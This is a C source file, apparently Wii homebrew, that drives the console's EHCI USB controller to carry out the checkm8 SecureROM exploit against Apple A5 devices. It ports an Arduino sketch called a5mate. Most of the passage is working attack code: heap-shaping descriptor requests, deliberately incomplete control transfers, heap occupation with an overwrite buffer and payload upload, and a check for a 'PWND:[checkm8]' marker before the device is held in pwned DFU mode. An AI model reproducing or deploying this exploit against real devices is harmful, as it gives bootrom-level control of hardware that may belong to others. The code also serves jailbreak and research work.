    }
    // Keep SOFs running during SET_ADDRESS recovery, without either IOS list.
    wr(CMD,(command&~(ASE|PSE))|1);delay_us(2000);
    wr(CMD,command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)){out->result=-7;goto restore;}
    if(recovery_mode==3 && !out->result) {
        const u8 wide_descriptor[8]={0x80,6,0,1,0,0,64,0};
        for(unsigned attempt=0;attempt<3;attempt++) {
            unsigned first=out->count;out->count+=3;
            out->result=control(w,address,wide_descriptor,64,command&~PSE,&out->stage[first]);
            if(out->result)goto restore;
            packet_stage *data=&out->stage[first+1];
            if(((data->after>>16)&0x7fff)==46 && !memcmp(data->bytes,expected,18)) {
                out->address_verified=1;goto restore;
            }
        }
        out->result=-25;
    }

restore:
    if(out->count) {
        volatile packet_dma *u=(volatile packet_dma*)((u32)w|0x40000000);
        out->last_qh_token=le(u->qh[6]);out->last_async=rd(ASYNC);
        out->expected_async=physical(w->qh);
    }
    wr(CMD,command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)){out->result=-7;return;}
    // Preserve pre-existing W1C events; acknowledge only our new port changes.
    u32 changes=(rd(port)&PORT_CHANGE)&~out->before;
    wr(port,(rd(port)&~PORT_CHANGE)|changes);
    wr(STS,(rd(STS)&7)&~status);
    wr(ASYNC,async);wr(CMD,command);wr(IRQ,irq);
    out->restored_command=rd(CMD);out->restored_async=rd(ASYNC);
    out->restored=wait_bits(STS,ASS,ASS,10000) && rd(CMD)==command && rd(ASYNC)==async;
    if(!out->restored)out->result=-9;
    iosFree(heap,w);
}

void packet_reset_target(u8 address,packet_reset *out) { reset_target(address,0,NULL,0,0,out); }
void packet_reset_target_retry(u8 address,packet_reset *out) { reset_target(address,1,NULL,0,0,out); }
void packet_reset_target_drain(u8 address,packet_reset *out) { reset_target(address,2,NULL,0,0,out); }
void packet_reset_interrupted(u8 address,u8 serial_index,int early_status,
                              packet_transaction *prefix,packet_reset *out) {
    reset_target(address,3,prefix,serial_index,early_status,out);
}
void packet_reset_after_transfer(u8 address,u8 serial_index,
                                 packet_transaction *transfer,packet_reset *out) {
    reset_target(address,4,transfer,serial_index,0,out);
}

/*
 * The routines below intentionally do not use libogc's USB control helpers.
 * a5mate holds the MAX3421E host state across its raw packets; completing an
 * intermediate STATUS stage, or letting IOS submit a request, changes the
 * SecureROM state that the next phase expects.  An EHCI context is therefore
 * retained from the first reset through the final normal-DFU verification.
 */
typedef struct {
    packet_dma *work;
    u32 command, irq, async, status;
    u8 port, address, send_toggle, recv_toggle;
    int active, async_running;
} a5mate_context;
static a5mate_context a5mate_held_context;
static int a5mate_held_active, a5mate_ejected;
static int a5mate_end(a5mate_context *ctx,a5mate_result *out);
static int a5mate_pause(a5mate_context *ctx);

/* EHCI advances FRINDEX on the first microframe after Run/Stop is set.  This
 * is the Wii equivalent of a5mate's "wait for SOF, then wait 20 ms" reset
 * transition.  No async or periodic schedule is enabled while waiting. */
static int a5mate_wait_frame(u32 micros,u32 *before,u32 *after) {
    u32 initial=rd(FRINDEX);
    if(before)*before=initial;
    u64 start=gettime();
    do {
        u32 current=rd(FRINDEX);
        if(current!=initial) {
            if(after)*after=current;
            return 0;
        }
    } while(ticks_to_microsecs(gettime()-start)<micros);
    if(after)*after=rd(FRINDEX);
    return -1;
}

static int a5mate_begin(a5mate_context *ctx,u8 address,a5mate_result *out) {
    memset(ctx,0,sizeof(*ctx));
    out->topology.selected_port=-1;
    if(!address || address>127 || rd(0xcd800064)!=0xffffffff ||
       rd(0xcd040000)!=0x01000010)return -1;
    if(heap<0)heap=iosCreateHeap(2048);
    if(heap<0)return -2;
    ctx->work=iosAlloc(heap,sizeof(*ctx->work));
    if(!ctx->work)return -2;
    ctx->command=rd(CMD);ctx->irq=rd(IRQ);ctx->async=rd(ASYNC);ctx->status=rd(STS);
    if(!(ctx->command&1) || !(ctx->command&ASE) || !(ctx->status&ASS)) {
        iosFree(heap,ctx->work);ctx->work=NULL;return -3;
    }
    out->topology.hcsparams=rd(0xcd040004);
    unsigned ports=out->topology.hcsparams&15U;
    for(unsigned p=0;p<ports;p++)out->topology.portsc[p]=rd(PORT_BASE+4*p);
    int selection=a5mate_select_port(&out->topology);
    if(selection){iosFree(heap,ctx->work);ctx->work=NULL;return selection;}
    ctx->port=(u8)out->topology.selected_port;
    wr(IRQ,0);wr(CMD,ctx->command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)) {
        wr(CMD,ctx->command);wr(IRQ,ctx->irq);iosFree(heap,ctx->work);ctx->work=NULL;return -4;
    }
    ctx->address=address;ctx->active=1;
    return 0;
}

static int a5mate_halt(a5mate_context *ctx) {
    if(!ctx->active)return -1;
    wr(CMD,ctx->command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000))return -7;
    ctx->async_running=0;
    return 0;
}

/* CHECKM8_INIT_RESET in the reference sketch spends three one-second LED
 * cycles with the USB host still running before it asks Usb::Task() for the
 * first bus reset.  Keep EHCI's frame clock (but no transfer schedule) alive
 * for the same interval; halting the controller during this settle period
 * would not be equivalent to the Arduino host. */
static int a5mate_initial_settle(a5mate_context *ctx) {
    if(a5mate_pause(ctx))return -7;
    delay_us(3000000);
    return 0;
}

/* Preserve the USB frame clock while changing the one-entry async schedule.
 * MAX3421E keeps bmSOFKAENAB enabled between each dispatchPkt(); stopping the
 * Wii controller after every qTD subtly changes the timing of SecureROM's
 * intentionally incomplete control transfers. */
static int a5mate_pause(a5mate_context *ctx) {
    if(!ctx->active)return -1;
    wr(CMD,(ctx->command&~(ASE|PSE))|1U);
    if(!wait_bits(STS,ASS,0,10000))return -7;
    ctx->async_running=0;
    return 0;
}

/* A completed qTD leaves the asynchronous QH linked but inactive.  Ring the
 * asynchronous-advance doorbell before reusing its overlay: this gives the
 * EHCI controller a defined point at which it is no longer caching that QH.
 * The Wii can then keep SOFs and its async schedule running across adjacent
 * packets.  A controller that does not acknowledge in time falls back to the
 * conservative stop/restart path. */
static int a5mate_recycle_async(a5mate_context *ctx,a5mate_result *out) {
    wr(STS,IAA);
    wr(CMD,(ctx->command&~PSE)|ASE|1U|IAAD);
    if(!wait_bits(STS,IAA,IAA,2000)) {
        out->async_fallbacks++;
        return a5mate_pause(ctx) ? -7 : 0;
    }
    wr(STS,IAA);
    out->async_advances++;
    return 1;
}

static int a5mate_packet_mode(a5mate_context *ctx,u8 address,u8 pid,u8 toggle,
                              const u8 *bytes,u16 size,a5mate_result *out,
                              int single_attempt) {
    /* a5mate deliberately keeps the target at USB address zero throughout
     * the exploit.  SETUP has just reset the address, and the Arduino sketch
     * never performs SET_ADDRESS before its raw packets. */
    if(!ctx->active || !ctx->work || address>127 || size>64 || pid>2 || toggle>1)return -10;
    packet_dma *w=ctx->work;
    int recycled=0;
    if(ctx->async_running) {
        int recycle=a5mate_recycle_async(ctx,out);
        if(recycle<0)return -7;
        recycled=recycle;
    }
    if(!recycled) {
        if(a5mate_pause(ctx))return -7;
        memset(w,0,sizeof(*w));
        w->qh[0]=le(physical(w->qh)|2);
        w->qh[2]=le(1U<<30);
    } else {
        /* The doorbell made this overlay quiescent; only the mutable transfer
         * area is rewritten while the QH remains on the async ring. */
        memset(w->qtd,0,sizeof(w->qtd));
        memset(w->qh+3,0,9*sizeof(w->qh[0]));
    }
    memset(w->bytes,0xff,sizeof(w->bytes));
    if(bytes && size)memcpy(w->bytes,bytes,size);
    /* MAX3421E dispatchPkt() retries NAK indefinitely until its 12 ms
     * software deadline.  In an EHCI QH that is RL=0: a non-zero reload
     * silently stalls the queue after that many NAKs.  The bare a5mate
     * send_out() primitive is the sole exception: RL=1 preserves its one
     * raw OUT attempt before it returns the NAK to the sketch. */
    w->qh[1]=le(address|(2U<<12)|(1U<<14)|(1U<<15)|(64U<<16)|
                ((single_attempt?1U:0U)<<28));
    w->qh[2]=le(1U<<30);w->qh[4]=le(physical(w->qtd));w->qh[5]=le(1);
    w->qtd[0]=le(1);w->qtd[1]=le(1);
    w->qtd[2]=le(((u32)toggle<<31)|((u32)size<<16)|(3U<<10)|((u32)pid<<8)|0x80);
    w->qtd[3]=le(physical(w->bytes));
    for(unsigned j=1;j<5;j++)w->qtd[3+j]=le((physical(w->bytes)&~4095U)+4096*j);
    DCFlushRange(w,sizeof(*w));
    volatile packet_dma *u=(volatile packet_dma*)((u32)w|0x40000000);
    if(!recycled) {
        wr(ASYNC,physical(w->qh));
        wr(CMD,(ctx->command&~PSE)|ASE|1U);
        if(!wait_bits(STS,ASS,ASS,2000))return -7;
        ctx->async_running=1;
    }
    /* ctrlReq()/dispatchPkt() in the Arduino reference retries NAKs for its
     * 12 ms transfer timeout.  Its separate send_out() primitive returns at
     * the first NAK.  RL=1 gives this qTD one physical EHCI transaction, but
     * a NAK leaves that qTD active rather than reporting a completion.  The
     * Wii needs a bounded 2 ms window after restarting its async schedule to
     * guarantee that this one transaction has actually been dispatched. */
    u64 start=gettime();u32 limit=single_attempt?2000:12000;int result=-5;
    do {
        u32 token=le(u->qtd[2]);
        if(token&0x7c){result=-6;break;}
        if(!(token&0x80)){result=((token>>16)&0x7fff)?-11:0;break;}
    }while(ticks_to_microsecs(gettime()-start)<limit);
    /* No transfer may remain live after its caller has interpreted the
     * result.  Otherwise an expired setup can ACK between two a5mate
     * primitives, unlike the MAX3421E which is synchronously reprogrammed
     * for the next token. */
    u32 final_token=le(u->qtd[2]);
    if(result==-5 && !(final_token&0x80))
        result=(final_token>>16)&0x7fff ? -11 : 0;
    int completed=!(final_token&0x80) && !(final_token&0x7c);
    if(!completed) {
        int pause_result=a5mate_pause(ctx);
        if(pause_result && !result)result=-7;
    }
    u32 elapsed_us=(u32)ticks_to_microsecs(gettime()-start);
    out->packet_elapsed_total_us+=elapsed_us;
    if(!out->packet_elapsed_min_us || elapsed_us<out->packet_elapsed_min_us)
        out->packet_elapsed_min_us=elapsed_us;
    if(elapsed_us>out->packet_elapsed_max_us)out->packet_elapsed_max_us=elapsed_us;
    out->last_token=final_token;out->packet_step++;
    if(!result)out->packets_ok++;
    else if(result==-5)out->packets_timeout++;
    else out->packets_error++;
    if(result) {
        if(!out->first_error_result) {
            out->first_error_step=out->packet_step;
            out->first_error_phase=(u8)out->phase;
            out->first_error_pid=pid;out->first_error_toggle=toggle;
            out->first_error_result=result;out->first_error_token=final_token;
        }
        out->last_error_step=out->packet_step;
        out->last_error_phase=(u8)out->phase;
        out->last_error_pid=pid;out->last_error_toggle=toggle;
        out->last_error_result=result;out->last_error_token=final_token;
    }
    DCInvalidateRange(w,sizeof(*w));
    return result;
}

static int a5mate_packet(a5mate_context *ctx,u8 address,u8 pid,u8 toggle,
                         const u8 *bytes,u16 size,a5mate_result *out) {
    return a5mate_packet_mode(ctx,address,pid,toggle,bytes,size,out,0);
}

static int a5mate_out(a5mate_context *ctx,const u8 *bytes,
                      a5mate_result *out,int heap_phase) {
    /* a5mate's raw send_out() does not reinitialize HCTL's sender toggle.
     * MAX3421E instead preserves that flip-flop across consecutive OUTs and
     * complements it only after an ACK.  Model that continuous DATA0/DATA1
     * sequence without advancing speculatively on a NAK/timeout. */
    int result=a5mate_packet_mode(ctx,ctx->address,0,ctx->send_toggle,bytes,64,out,1);
    if(!result)ctx->send_toggle^=1;
    if(heap_phase) {
        unsigned index=out->heap_out_attempted++;
        if(!result)out->heap_out_ok++;
        else if(!out->heap_out_failure_result) {
            out->heap_out_failure_result=result;out->heap_out_failure_index=index;
            out->heap_out_failure_token=out->last_token;
        }
    } else {
        unsigned index=out->global_out_attempted++;
        if(!result)out->global_out_ok++;
        else if(!out->global_out_failure_result) {
            out->global_out_failure_result=result;out->global_out_failure_index=index;
            out->global_out_failure_token=out->last_token;
        }
    }
    return result;
}

/* Each serial-descriptor SETUP makes the device's first control IN packet
 * DATA1.  Consecutive raw IN packets within one data stage then alternate. */
static int a5mate_raw_in(a5mate_context *ctx,const u8 *bytes,a5mate_result *out) {
#if defined(A5_8942)
    int result=a5mate_packet_mode(ctx,ctx->address,1,ctx->recv_toggle,bytes,64,out,1);
#else
    int result=a5mate_packet(ctx,ctx->address,1,ctx->recv_toggle,bytes,64,out);
#endif
    if(!result)ctx->recv_toggle^=1;
    return result;
}

static int a5mate_setup(a5mate_context *ctx,u8 address,u8 type,u8 request,
                        u16 value,u16 index,u16 length,a5mate_result *out) {
    const u8 setup[8]={type,request,(u8)value,(u8)(value>>8),
                       (u8)index,(u8)(index>>8),(u8)length,(u8)(length>>8)};
    /* ctrlReq_SETUP() stops after dispatchPkt(tokSETUP).  It deliberately
     * does not re-arm MAX3421E's receiver flip-flop: a5mate writes RCVTOG1
     * only at its two explicit feng-shui boundaries. */
    return a5mate_packet(ctx,address,2,0,setup,sizeof(setup),out);
}

static int a5mate_reset_default(a5mate_context *ctx,a5mate_result *out) {
    out->reset_result=-1;out->reset_stage=1;
    if(a5mate_halt(ctx)){out->reset_result=-7;return -7;}
    u32 port=PORT_BASE+4*ctx->port;
    u32 before=rd(port);
    out->reset_before=before;
    if((before&0x3105)!=0x1005){out->reset_result=-21;return -21;}
    out->reset_stage=2;
    wr(CMD,(ctx->command&~(ASE|PSE))|1U);
    if(rd(port)&PORT_SUSPEND) {
        wr(port,(rd(port)&~PORT_CHANGE)|PORT_RESUME);delay_us(20000);
        wr(port,rd(port)&~(PORT_CHANGE|PORT_RESUME));
        if(!wait_bits(port,PORT_RESUME|PORT_SUSPEND,0,10000)){out->reset_result=-22;return -22;}
    }
    wr(port,(rd(port)&~(PORT_CHANGE|4U))|PORT_RESET);delay_us(50000);
    out->reset_stage=3;
    wr(port,rd(port)&~(PORT_CHANGE|PORT_RESET));
    if(!wait_bits(port,PORT_RESET,0,10000)){out->reset_result=-23;return -23;}
    out->reset_stage=4;
    if(a5mate_wait_frame(20000,&out->reset_frame_before,&out->reset_frame_after)){
        out->reset_command=rd(CMD);out->reset_status=rd(STS);out->reset_result=-26;return -26;
    }
    delay_us(20000);
    out->reset_after=rd(port);out->reset_command=rd(CMD);out->reset_status=rd(STS);
    if((out->reset_after&0x3105)!=0x1005) {
        /* After set_global_state(), SecureROM can briefly detach from the
         * root port.  Usb::Task() in the patched Arduino host observes that
         * detach, waits USB_SETTLE_DELAY (200 ms) on reattach, then starts a
         * new bus reset.  Mirror that state transition rather than treating
         * the first 20 ms observation as a permanent failure. */
        out->reset_stage=5;
        if(!wait_bits(port,1,1,500000)){out->reset_result=-24;return -24;}
        delay_us(200000);
        wr(port,(rd(port)&~(PORT_CHANGE|4U))|PORT_RESET);delay_us(50000);
        wr(port,rd(port)&~(PORT_CHANGE|PORT_RESET));
        if(!wait_bits(port,PORT_RESET,0,10000)){out->reset_result=-23;return -23;}
        if(a5mate_wait_frame(20000,&out->reset_frame_before,&out->reset_frame_after)){
            out->reset_command=rd(CMD);out->reset_status=rd(STS);out->reset_result=-26;return -26;
        }
        delay_us(20000);
        out->reset_after=rd(port);out->reset_command=rd(CMD);out->reset_status=rd(STS);
        if((out->reset_after&0x3105)!=0x1005){out->reset_result=-24;return -24;}
    }
    out->reset_stage=6;
    /* The reset restores the default USB address.  Do not reassign the
     * address: every a5mate control primitive below is explicitly issued to
     * address zero, just as Usb.ctrlReq_SETUP(0, ...) does in the Arduino
     * reference. */
    out->reset_stage=7;
    ctx->address=0;
    out->reset_result=0;
    return 0;
}

static int a5mate_hold_pwndfu(a5mate_context *ctx,a5mate_result *out) {
    /* Keep SOFs running but leave both schedules off.  The original Arduino
     * host similarly stays alive after CHECKM8_END; restoring IOS58 here
     * would let it send an unrequested EP0 transfer to the newly pwned DFU
     * device.  The allocation is intentionally retained until the Wii app
     * is stopped by the operator. */
    if(a5mate_held_active)return -8;
    wr(CMD,(ctx->command&~(ASE|PSE))|1U);
    a5mate_held_context=*ctx;
    a5mate_held_active=1;a5mate_ejected=0;
    /* Ownership and the DMA allocation move to the held context. */
    ctx->active=0;ctx->work=NULL;
    out->held=1;
    return 0;
}

int packet_a5mate_eject(a5mate_result *out) {
    memset(out,0,sizeof(*out));out->result=-1;
    if(!a5mate_held_active || a5mate_ejected)return out->result=-1;
    a5mate_context *ctx=&a5mate_held_context;
    if(a5mate_halt(ctx))return out->result=-7;
    /* Disabling the root port stops bus traffic while preserving the iPhone's
     * pwnDFU memory state.  IOS58 is intentionally still excluded: it must
     * not submit a control request during the physical cable handoff. */
    u32 port=PORT_BASE+4*ctx->port;
    u32 value=rd(port);
    wr(port,value&~(PORT_CHANGE|PORT_RESET|PORT_ENABLE));
    delay_us(2000);
    out->ejected=1;out->held=1;out->result=0;
    a5mate_ejected=1;
    return 0;
}

int packet_a5mate_release(a5mate_result *out) {
    memset(out,0,sizeof(*out));out->result=-1;
    if(!a5mate_held_active || !a5mate_ejected)return out->result=-1;
    a5mate_context *ctx=&a5mate_held_context;
    u32 port=PORT_BASE+4*ctx->port;
    /* Do not put IOS58 back in charge until the target really is gone. */
    if(rd(port)&1U)return out->result=-2;
    int result=a5mate_end(ctx,out);
    if(!result){a5mate_held_active=0;a5mate_ejected=0;}
    out->result=result;
    return result;
}

static int a5mate_end(a5mate_context *ctx,a5mate_result *out) {
    if(!ctx->active)return 0;
    wr(CMD,ctx->command&~(ASE|PSE|1U));
    if(!wait_bits(STS,HALT,HALT,10000)) {out->restored=0;return -7;}
    wr(STS,(rd(STS)&7)&~ctx->status);wr(ASYNC,ctx->async);wr(CMD,ctx->command);wr(IRQ,ctx->irq);
    out->restored=wait_bits(STS,ASS,ASS,10000) && rd(CMD)==ctx->command && rd(ASYNC)==ctx->async;
    ctx->active=0;
    iosFree(heap,ctx->work);ctx->work=NULL;
    return out->restored ? 0 : -9;
}

static int a5mate_status_in(a5mate_context *ctx,u8 address,a5mate_result *out) {
    return a5mate_packet(ctx,address,1,1,NULL,0,out);
}

static int a5mate_status_out(a5mate_context *ctx,u8 address,a5mate_result *out) {
    return a5mate_packet(ctx,address,0,1,NULL,0,out);
}

static int a5mate_getstatus(a5mate_context *ctx,u8 address,a5mate_result *out) {
    if(a5mate_setup(ctx,address,0xa1,3,0,0,6,out))return -1;
    if(a5mate_packet(ctx,address,1,1,NULL,6,out))return -1;
    return a5mate_status_out(ctx,address,out);
}

static int a5mate_feng_shui(a5mate_context *ctx,u8 serial,a5mate_result *out) {
    u8 scratch[64];memset(scratch,0xcc,sizeof(scratch));
    /* The initial stall is intentionally non-fatal, exactly as in a5mate. */
    if(a5mate_setup(ctx,ctx->address,2,3,0,0x80,0,out))return -1;
    (void)a5mate_status_in(ctx,ctx->address,out);
    /* heap_feng_shui() explicitly writes bmRCVTOG1 before this sequence. */
    ctx->recv_toggle=1;
    unsigned success=0,attempts=0;
    while(success<620 && attempts++<4096) {
        if(a5mate_setup(ctx,ctx->address,0x80,6,(u16)(0x300|serial),0x40a,0x80,out))continue;
        /* heap_feng_shui_req() returns setup_rcode; its deliberately raw IN
         * result is printed by the Arduino sketch but is not a success
         * condition.  A NAK here is part of the intended heap shaping. */
        success++;
        (void)a5mate_raw_in(ctx,scratch,out);
#if defined(A5_8942)
        delay_us(1000);
#endif
    }
    if(success!=620)return -30;
    if(a5mate_setup(ctx,ctx->address,0x80,6,(u16)(0x300|serial),0x40a,0x81,out))return -31;
    /* The trailing no-leak request follows the same raw-IN path as the
     * preceding 620 requests.  There is no intervening RCVTOG write in the
     * sketch, so its expected PID must be the currently retained one. */
    (void)a5mate_raw_in(ctx,scratch,out);
#if defined(A5_8942)
    delay_us(1000);
#endif
    return 0;
}

static int a5mate_global_state(a5mate_context *ctx,a5mate_result *out) {
    u8 scratch[64];memset(scratch,0xcc,sizeof(scratch));
    /* The Arduino sketch logs, but deliberately does not branch on, these
     * raw transfer results.  In particular, the IN status after the two
     * manually emitted OUT packets is allowed to time out before the next
     * standard DFU request reshapes SecureROM's state. */
    (void)a5mate_setup(ctx,ctx->address,0x21,1,0,0,64,out);
    /* Consecutive raw OUT packets alternate using MAX3421E's sender
     * flip-flop, which ctrlReq_SETUP() does not reinitialize in a5mate. */
    (void)a5mate_out(ctx,scratch,out,0);
    (void)a5mate_out(ctx,scratch,out,0);
    (void)a5mate_status_in(ctx,ctx->address,out);
    (void)a5mate_setup(ctx,ctx->address,0x21,1,0,0,0,out);
    (void)a5mate_status_in(ctx,ctx->address,out);
    (void)a5mate_getstatus(ctx,ctx->address,out);
    (void)a5mate_getstatus(ctx,ctx->address,out);
    if((padding+64)%64 || padding%64)return -32;
    (void)a5mate_setup(ctx,ctx->address,0x21,1,0,0,(u16)(padding+64),out);
    for(unsigned offset=0;offset<(unsigned)(padding+64);offset+=64) {
        /* This is the exact a5mate request length and packet count.  On an
         * OUT error set_global_state() returns; its outer Arduino automaton
         * still schedules its reset and heap-occupation states afterwards. */
        if(a5mate_out(ctx,scratch,out,0))break;
    }
    return 0;
}

static int a5mate_heap_occupation(a5mate_context *ctx,u8 serial,a5mate_result *out) {
    u8 scratch[64];memset(scratch,0xcc,sizeof(scratch));
    /* heap_occupation() explicitly writes bmRCVTOG1 before this no-leak IN. */
    ctx->recv_toggle=1;
    (void)a5mate_setup(ctx,ctx->address,0x80,6,(u16)(0x300|serial),0x40a,0x81,out);
    /* As in heap_feng_shui_req(), the no-leak IN is issued but not used as
     * flow control by the Arduino reference. */
    (void)a5mate_raw_in(ctx,scratch,out);
    (void)a5mate_setup(ctx,ctx->address,0,0,0,0,64,out);
    (void)a5mate_out(ctx,scratch,out,1);
    for(unsigned i=0;i<64;i++)scratch[i]=overwrite[i];
    (void)a5mate_out(ctx,scratch,out,1);
    if(sizeof(payload)%64)return -33;
    (void)a5mate_setup(ctx,ctx->address,0x21,1,0,0,sizeof(payload),out);
    memset(scratch,0xcc,sizeof(scratch));
    (void)a5mate_out(ctx,scratch,out,1);
    for(unsigned offset=0;offset<sizeof(payload);offset+=64)
        (void)a5mate_out(ctx,payload+offset,out,1);
    return 0;
}

#if !defined(A5_8942)
/* This is the one permitted post-payload probe.  checkm8 identifies a
 * successfully pwned SecureROM by replacing its serial descriptor with this
 * exact ASCII payload.  It is a read-only standard request at the default
 * address and deliberately does not reset, detach, or ask for DFU state. */
static int a5mate_pwn_marker(a5mate_context *ctx,u8 serial,a5mate_result *out) {
    u8 data[64];
    /* a5mate addresses every serial-descriptor request with 0x040a; use the
     * same language ID for the post-payload observation so an unsupported
     * alternate locale cannot masquerade as an absent pwnDFU marker. */
    if(a5mate_setup(ctx,ctx->address,0x80,6,(u16)(0x300|serial),0x40a,64,out))return 0;
    if(a5mate_packet(ctx,ctx->address,1,1,data,64,out))return 0;
    memcpy(data,ctx->work->bytes,sizeof(data));
    if(a5mate_status_out(ctx,ctx->address,out))return 0;
    char ascii[31]={0};
    if(data[1]==3 && data[0]>=2 && !(data[0]&1)) {
        unsigned n=(data[0]-2)/2;if(n>30)n=30;
        for(unsigned i=0;i<n;i++)ascii[i]=data[2+2*i];
    }
    return strcmp(ascii,"PWND:[checkm8]")==0;
}
#endif

unsigned packet_a5mate_profile_padding(void) { return (unsigned)padding; }

int packet_a5mate_profile(u8 address,u8 serial_index,a5mate_result *out) {
    a5mate_context ctx;memset(out,0,sizeof(*out));out->result=-1;
    out->global_out_failure_result=0;out->heap_out_failure_result=0;
    if(!address || !serial_index)return out->result=-1;
    int result=a5mate_begin(&ctx,address,out);if(result){out->result=result;return result;}
    out->phase=1;
    if((result=a5mate_initial_settle(&ctx)))goto done;
    if((result=a5mate_reset_default(&ctx,out)))goto done;
    out->phase=2;
    if((result=a5mate_feng_shui(&ctx,serial_index,out)))goto done;
    out->phase=3;
    if((result=a5mate_global_state(&ctx,out)))goto done;
    if((result=a5mate_reset_default(&ctx,out)))goto done;
    out->phase=4;
    if((result=a5mate_heap_occupation(&ctx,serial_index,out)))goto done;
    if((result=a5mate_reset_default(&ctx,out)))goto done;
#if defined(A5_8942)
    result=0;
#else
    /* First milestone: retain the Wii controller only after the pwnDFU
     * serial marker is actually present.  There is intentionally no normal
     * DFU probe or exit reset after this check. */
    out->pwn_marker_seen=a5mate_pwn_marker(&ctx,serial_index,out);
    if(!out->pwn_marker_seen){result=-34;goto done;}
    out->pwn_ready=1;
    result=a5mate_hold_pwndfu(&ctx,out);
    if(!result){out->result=0;return 0;}
#endif
done:
    out->result=result;
    { int end=a5mate_end(&ctx,out);if(!out->result && end)out->result=end; }
    return out->result;
}

int packet_a5mate_hold_existing(u8 address,a5mate_result *out) {
    a5mate_context ctx;
    memset(out,0,sizeof(*out));out->result=-1;
    if(!address || address>127)return out->result=-1;
    int result=a5mate_begin(&ctx,address,out);
    if(result){out->result=result;return result;}
    /* No descriptor, reset, or endpoint transaction follows this point. */
    out->phase=5;out->pwn_marker_seen=1;out->pwn_ready=1;
    result=a5mate_hold_pwndfu(&ctx,out);
    if(!result){out->result=0;return 0;}
    out->result=result;
    { int end=a5mate_end(&ctx,out);if(!out->result && end)out->result=end; }
    return out->result;
}
